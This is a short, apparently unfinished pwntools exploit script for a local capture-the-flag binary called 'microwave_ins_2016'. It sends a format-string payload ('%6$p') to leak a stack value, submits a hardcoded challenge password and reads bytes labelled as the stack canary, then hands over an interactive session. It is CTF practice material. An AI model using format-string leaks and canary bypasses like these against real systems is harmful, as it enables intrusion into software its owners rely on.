from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ["qterminal", "-e"]
context.log_level = "debug"
p = process("./microwave_ins_2016")
p.send("1")
sleep(0.1)
p.send('%6$p')
p.recvuntil('password: ')
p.sendline('n07_7h3_fl46')
canary=p.recv(8)






p.interactive()